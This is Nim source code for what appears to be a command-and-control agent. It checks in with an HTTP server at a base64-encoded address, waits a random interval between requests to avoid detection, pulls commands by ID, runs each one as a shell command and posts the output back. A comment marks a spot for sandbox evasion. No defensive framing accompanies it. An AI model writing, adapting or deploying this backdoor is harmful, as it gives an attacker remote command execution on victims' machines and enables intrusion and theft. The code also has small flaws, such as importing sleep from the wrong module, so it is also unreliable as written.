from random import randomize, rand
from base64 import encode, decode
from os import sleep
from strutils import contains, split, parseInt, intToStr
from std/httpclient import newHttpClient, postContent, close
from std/osproc import execCmdEx

const 
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    debug = false

proc rstr(t: var string, l:int) =
    randomize()
    t = newString(l)
    for i in 0 .. l-1:
        t[i] = chars[rand(chars.len-1)]

var 
    h:string
    j = 20000
h.rstr(10)
    
proc print(t:string) =
    if debug:
        echo t

proc rcv(c: var string, id:int) =
    let c_id = id.intToStr().encode()
    var 
        clt = newHttpClient()
        url = h.decode()&"/"&c_id
    try:
        c = clt.postContent(url).decode()
    finally:
        clt.close()


proc snd(c: string): bool =
    let cmd = c.encode()
    var 
        clt = newHttpClient()
        url = h.decode()&"/"&cmd
        rst = ""
    try:
        rst = clt.postContent(url).decode()
    finally:
        clt.close()
        return rst == "ACK"
    

proc run(name:string) =
    var 
        running = true
        cmd:string
        id = 0

    while running:
        randomize()
        cmd.rstr(10)
        
        # Jitter
        sleep(rand(j))
        
        # Receive CMD from ID
        cmd.rcv(id)
        print("cmd:"&cmd)
        case cmd
        of "n-id":
            continue # Skip the beaconing if ID does not exist
        of "sleep":
            randomize()
            sleep(rand(j))
        of "exit":
            running = false
        else:
            var rstl = cmd.execCmdEx()
            print("rslt:"&rstl[0])
            let r = snd("rslt:"&rstl[0])
            if r: # ACK success
                print("scc")
            else:
                print("err")

        randomize()
        sleep(rand(j))
        
        # Increment CMD ID
        inc id

proc main() = 
    # TODO: Insert Sandbox evasion here
    
    #h = "http://127.0.0.1:8080" # Replace host endpoint. TODO: Define
    h = "aHR0cDovLzEyNy4wLjAuMTo4MDgw"

    var name:string
    name.rstr(10)

    print("agt:"&name)
    let init = snd("agt:"&name)
    if init:
        print("scc")
        run(name)
    else:
        print("err")
        return
main()